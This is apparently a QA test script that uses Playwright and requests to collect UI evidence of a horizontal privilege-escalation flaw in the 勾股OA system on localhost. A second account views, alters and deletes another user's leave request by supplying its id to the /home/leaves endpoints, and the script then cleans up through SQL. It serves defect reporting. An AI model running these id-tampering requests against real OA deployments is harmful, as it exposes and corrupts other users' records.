# -*- coding: utf-8 -*-
"""
勾股OA —— 水平越权的界面侧取证（UI 对照法）

要证明的三件事，各自需要界面证据：
  1. 正当路径 /oa/attendance/datalist?tab=N 只显示**本人**记录
     （源码 oa/controller/Attendance.php:49 `$where[] = ['admin_id','=',$this->uid]`）
  2. 旁路 /home/{leaves,...}/view?id=X 却能打开**他人**单据
  3. 攻击者篡改后，受害者在自己的正当页面上看到被改过的内容（影响可见）
  另附：/home/overtimes|trips|outs/datalist 三个页面是从 leaves 复制的、URL 未改，
        实际加载的是**请假**数据（页面串数据）。

数据构造走接口（oa_leaves_types 为空，界面下拉无选项，无法从界面建单）。
结束后物理删除测试单据，恢复 oa_* 四表为空。

用法：python 06_UI自动化\\probe_horizontal_ui.py
"""
import base64
import os
import re
import subprocess
import sys
import time

import requests

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "03_接口测试"))
from oa_login import BASE_URL, login  # noqa: E402
import oa_config  # noqa: E402

from playwright.sync_api import sync_playwright  # noqa: E402

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

SHOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "04_缺陷报告", "截图")
os.makedirs(SHOT_DIR, exist_ok=True)

VICTIM = "yucixin"
ATTACKER = "testemp"
MARKER = "【水平越权UI取证-%d】" % int(time.time())


def run_sql(sql):
    b64 = base64.b64encode(sql.encode("utf-8")).decode("ascii")
    shell = "echo %s | base64 -d | %s 2>/dev/null" % (b64, oa_config.MYSQL)
    o = subprocess.run(["wsl", "-d", oa_config.WSL_DISTRO, "-u", "root", "--", "bash", "-c", shell],
                       capture_output=True, text=True, encoding="utf-8", errors="replace")
    return (o.stdout or "").strip()


def shot(page, name):
    p = os.path.join(SHOT_DIR, name)
    page.screenshot(path=p, full_page=False)
    return p


def body_text(page):
    return re.sub(r"\s+", " ", page.inner_text("body"))


def main():
    victim_s = login(VICTIM, oa_config.USER_PWD)
    atk_s = login(ATTACKER, oa_config.USER_PWD)

    # ---- 受害者建一张请假单（走被测系统自身接口）----
    now = int(time.time())
    r = victim_s.post(BASE_URL + "/home/leaves/add", data={
        "types": 1, "duration": 1,
        "start_date": time.strftime("%Y-%m-%d %H:%M", time.localtime(now + 86400)),
        "end_date": time.strftime("%Y-%m-%d %H:%M", time.localtime(now + 86400 + 3600)),
        "reason": MARKER, "file_ids": "",
    }, timeout=30)
    rid = (r.json().get("data") or {}).get("return_id")
    print("受害者 %s 建请假单 id=%s 事由=%s" % (VICTIM, rid, MARKER))

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            ctx = browser.new_context(viewport={"width": 1440, "height": 900})
            ctx.add_cookies([
                {"name": "PHPSESSID", "value": victim_s.cookies.get("PHPSESSID"),
                 "domain": "localhost", "path": "/"},
            ])
            page = ctx.new_page()

            # ===== 1. 受害者正当页面：我的假勤 → 只看得到自己的 =====
            page.goto(BASE_URL + "/oa/attendance/datalist?tab=1",
                      wait_until="networkidle", timeout=30000)
            page.wait_for_timeout(2000)
            shot(page, "HZ-01_受害者我的假勤页_仅本人记录.png")
            t = body_text(page)
            print("\n[1] 受害者 /oa/attendance/datalist?tab=1")
            print("    页面含本次事由标记: %s" % (MARKER in t))
            rows = page.query_selector_all("table tbody tr")
            print("    表格行数: %d" % len(rows))
            if rows:
                print("    首行: %s" % re.sub(r"\s+", " ", rows[0].inner_text())[:150])

            # ===== 2. 攻击者正当页面：同一页 → 看不到受害者的 =====
            # 注意：必须先切 cookie 再截图，否则拍到的是受害者的页面（本脚本初版踩过此坑）
            ctx.clear_cookies()
            ctx.add_cookies([{"name": "PHPSESSID", "value": atk_s.cookies.get("PHPSESSID"),
                              "domain": "localhost", "path": "/"}])
            page.goto(BASE_URL + "/oa/attendance/datalist?tab=1",
                      wait_until="networkidle", timeout=30000)
            page.wait_for_timeout(2000)
            shot(page, "HZ-02_攻击者我的假勤页_看不到他人记录.png")
            t2 = body_text(page)
            print("\n[2] 攻击者 %s 同一页面（已确认会话为攻击者）" % ATTACKER)
            print("    当前会话 cookie: %s" % atk_s.cookies.get("PHPSESSID")[:12])
            print("    页面含受害者事由标记: %s （False = 正当路径确实按人隔离）" % (MARKER in t2))
            print("    表格行数: %d" % len(page.query_selector_all("table tbody tr")))

            # ===== 3. 攻击者越权打开受害者单据 =====
            page.goto(BASE_URL + "/home/leaves/view?id=%s" % rid,
                      wait_until="networkidle", timeout=30000)
            page.wait_for_timeout(1200)
            shot(page, "HZ-03_攻击者越权打开受害者请假单.png")
            t3 = body_text(page)
            print("\n[3] 攻击者 GET /home/leaves/view?id=%s" % rid)
            print("    看到受害者事由原文: %s" % (MARKER in t3))

            # ===== 4. 加班列表页实际加载的是请假数据（页面串数据）=====
            page.goto(BASE_URL + "/home/overtimes/datalist",
                      wait_until="networkidle", timeout=30000)
            page.wait_for_timeout(2000)
            shot(page, "HZ-04_加班列表页实为请假数据.png")
            t4 = body_text(page)
            print("\n[4] /home/overtimes/datalist 页面文本片段: %s" % t4[:200])
            has_add_leaves = "添加请假" in t4
            print("    页面上出现「添加请假」按钮: %s （该页本应是加班）" % has_add_leaves)
            print("    该页是否列出请假单: %s （layui 表格带 page/limit 参数，见下方 [4b]）" % (MARKER in t4))

            # ===== 4b. 核实 datalist 参数错位：带 page/limit 时的真实响应 =====
            print("\n[4b] home/leaves/datalist 在带与不带分页参数时的差异（接口侧）")
            for label, payload in [("空参数", {}), ("带 page/limit（layui 表格实际发的）",
                                                 {"page": 1, "limit": 10})]:
                rr = victim_s.post(BASE_URL + "/home/leaves/datalist", data=payload, timeout=30)
                try:
                    j = rr.json()
                    print("    %-28s -> code=%s count=%s 行数=%s msg=%s"
                          % (label, j.get("code"), j.get("count"),
                             len(j.get("data") or []), str(j.get("msg"))[:110]))
                except Exception:
                    print("    %-28s -> HTTP %s %s" % (label, rr.status_code, rr.text[:110]))

            # ===== 5. 攻击者篡改 → 受害者在自己正当页面上看到被改内容 =====
            atk_s.post(BASE_URL + "/home/leaves/add",
                       data={"id": rid, "reason": MARKER + "【已被 testemp 篡改】"}, timeout=30)
            print("\n[5] 攻击者已篡改事由，受害者回看自己的正当页面：")

            ctx.clear_cookies()
            ctx.add_cookies([{"name": "PHPSESSID", "value": victim_s.cookies.get("PHPSESSID"),
                              "domain": "localhost", "path": "/"}])
            page.goto(BASE_URL + "/oa/attendance/datalist?tab=1",
                      wait_until="networkidle", timeout=30000)
            page.wait_for_timeout(2000)
            shot(page, "HZ-06_受害者页面显示事由已被篡改.png")
            t5 = body_text(page)
            print("    受害者页面出现「已被 testemp 篡改」: %s" % ("已被 testemp 篡改" in t5))

            # ===== 6. 攻击者删除 → 受害者页面是否还看得到 =====
            atk_s.delete(BASE_URL + "/home/leaves/del", params={"id": rid}, timeout=30)
            page.goto(BASE_URL + "/oa/attendance/datalist?tab=1",
                      wait_until="networkidle", timeout=30000)
            page.wait_for_timeout(2000)
            print("\n[6] 攻击者执行删除后，受害者页面行数: %d"
                  % len(page.query_selector_all("table tbody tr")))
            # 攻击者直接越权访问已被「删除」的单据
            ctx.clear_cookies()
            ctx.add_cookies([{"name": "PHPSESSID", "value": atk_s.cookies.get("PHPSESSID"),
                              "domain": "localhost", "path": "/"}])
            page.goto(BASE_URL + "/home/leaves/view?id=%s" % rid,
                      wait_until="networkidle", timeout=30000)
            page.wait_for_timeout(1200)
            shot(page, "HZ-07_已删除单据仍可被打开.png")
            print("    「删除」后越权访问同一单 -> 仍含事由原文: %s"
                  % ("已被 testemp 篡改" in body_text(page)))

            browser.close()
    finally:
        run_sql("DELETE FROM oa_leaves WHERE id = %s;" % rid)
        print("\n清理：已物理删除测试单 id=%s" % rid)
        print("回读四表行数 -> %s" % run_sql(
            "SELECT 'leaves' t,count(*) c FROM oa_leaves UNION ALL "
            "SELECT 'overtimes',count(*) FROM oa_overtimes UNION ALL "
            "SELECT 'trips',count(*) FROM oa_trips UNION ALL "
            "SELECT 'outs',count(*) FROM oa_outs;").replace("\n", "  "))

    print("\n截图目录: %s" % os.path.abspath(SHOT_DIR))


if __name__ == "__main__":
    main()
